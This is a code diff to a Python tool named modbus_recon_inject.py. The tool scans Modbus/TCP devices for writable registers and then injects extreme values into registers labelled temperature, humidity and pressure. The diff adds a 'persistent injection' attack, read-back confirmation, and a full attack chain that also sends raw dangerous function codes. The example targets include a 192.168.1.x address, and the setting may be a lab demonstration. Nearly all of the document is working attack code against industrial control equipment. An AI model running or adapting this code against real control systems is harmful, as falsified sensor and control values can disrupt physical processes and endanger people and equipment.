@@ -8,7 +8,6 @@ import random
 
 logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
 
-
 class ModbusRecon:
     def __init__(self, target_host, target_port, attack_mode='scan'):
         self.target_host = target_host
@@ -116,40 +115,79 @@ class ModbusRecon:
         logging.info(f'[RECON] Found {len(self.findings["writable_registers"])} writable registers')
 
     def dangerous_writes(self):
-        logging.warning('[INJECT] Starting dangerous write injection...')
-        
-        if not self.findings['writable_registers']:
-            logging.error('[INJECT] No writable registers found. Run recon first.')
-            return
+        logging.warning('[INJECT] Starting DANGEROUS write injection...')
         
         client = ModbusClient(host=self.target_host, port=self.target_port,
-                            timeout=1, auto_open=True, auto_close=True)
+                            timeout=2, auto_open=True, auto_close=True)
         
         if not client.open():
             logging.error('[INJECT] Failed to connect')
             return
         
+        # FOCUS ON REGISTERS 0, 1, 2 (temperature, humidity, pressure)
+        target_registers = [0, 1, 2]
+        
         dangerous_values = [
-            0,
-            65535,
-            0xDEAD,
-            0xBEEF,
-            32767,
-            32768,
+            # Extreme values that will be visible in UI
+            0, 100, 255, 1000, 5000, 10000, 30000, 65535,
+            0xDEAD, 0xBEEF, 0xCAFE, 0xFFFF
         ]
         
-        for addr in self.findings['writable_registers']:
-            for val in dangerous_values:
+        for addr in target_registers:
+            logging.warning(f'[INJECT] ATTACKING register {addr} (UI-visible)')
+            
+            for val in dangerous_values[:4]:  # Limit to first 4 values per register
                 try:
                     success = client.write_single_register(addr, val)
                     if success:
-                        logging.warning(f'[INJECT] Wrote {val} (0x{val:04X}) to register {addr}')
-                    time.sleep(0.1)
-                except:
-                    pass
+                        logging.warning(f'[INJECT] SUCCESS! Wrote {val} to register {addr}')
+                        
+                        # Read back to verify
+                        verify = client.read_holding_registers(addr, 1)
+                        if verify:
+                            logging.warning(f'[INJECT] CONFIRMED: Register {addr} now contains {verify[0]}')
+                        
+                        # Keep the value for a few seconds to make it visible in UI
+                        time.sleep(2)
+                    
+                except Exception as e:
+                    logging.error(f'[INJECT] Error writing to {addr}: {e}')
+                
+                time.sleep(0.5)
         
         client.close()
-        logging.warning('[INJECT] Dangerous write injection completed')
+        logging.warning('[INJECT] Dangerous write injection COMPLETED')
+
+    def persistent_injection(self):
+        """Inject values that persist longer"""
+        logging.warning('[INJECT] Starting PERSISTENT injection attack...')
+        
+        client = ModbusClient(host=self.target_host, port=self.target_port,
+                            timeout=2, auto_open=True, auto_close=True)
+        
+        if not client.open():
+            return
+        
+        # Target the main UI registers
+        attacks = [
+            (0, 9999, "EXTREME TEMPERATURE"),
+            (1, 8888, "EXTREME HUMIDITY"), 
+            (2, 7777, "EXTREME PRESSURE"),
+            (0, 0, "ZERO TEMPERATURE"),
+            (1, 100, "MAX HUMIDITY"),
+            (2, 1100, "MAX PRESSURE")
+        ]
+        
+        for addr, value, description in attacks:
+            try:
+                success = client.write_single_register(addr, value)
+                if success:
+                    logging.warning(f'[INJECT] PERSISTENT: {description} - wrote {value} to register {addr}')
+                    time.sleep(3)  # Keep each value for 3 seconds
+            except Exception as e:
+                logging.error(f'[INJECT] Persistent attack failed: {e}')
+        
+        client.close()
 
     def raw_function_codes(self):
         logging.warning('[INJECT] Sending dangerous function codes...')
@@ -203,10 +241,17 @@ class ModbusRecon:
             self.test_write_access()
         
         elif self.attack_mode == 'inject':
-            self.scan_registers(max_addr=100)
-            self.test_write_access()
+            # FOCUS ON VISIBLE CHANGES
+            logging.warning('[INJECT] PHASE 1: Quick scan for writable registers')
+            self.scan_registers(max_addr=10)  # Only scan first 10 registers
             time.sleep(1)
+            
+            logging.warning('[INJECT] PHASE 2: Dangerous writes to UI-visible registers')
             self.dangerous_writes()
+            time.sleep(1)
+            
+            logging.warning('[INJECT] PHASE 3: Persistent injection attack')
+            self.persistent_injection()
         
         elif self.attack_mode == 'raw_funcs':
             self.raw_function_codes()
@@ -216,6 +261,8 @@ class ModbusRecon:
             self.test_write_access()
             time.sleep(1)
             self.dangerous_writes()
+            time.sleep(1)
+            self.persistent_injection()
             time.sleep(1)
             self.raw_function_codes()
         
@@ -229,14 +276,13 @@ if __name__ == '__main__':
         epilog="""
 Attack modes:
   scan        - Scan for readable/writable registers
-  inject      - Write dangerous values to registers
+  inject      - Write dangerous values to registers (VISIBLE IN UI)
   raw_funcs   - Send dangerous raw function codes
   full        - Complete attack chain (all of the above)
 
 Examples:
-  python modbus_recon_inject.py --target 127.0.0.1 --mode scan
+  python modbus_recon_inject.py --target 127.0.0.1 --mode inject
   python modbus_recon_inject.py --target 192.168.1.10 --mode full
-  python modbus_recon_inject.py --target 127.0.0.1 --mode raw_funcs
         """
     )
     
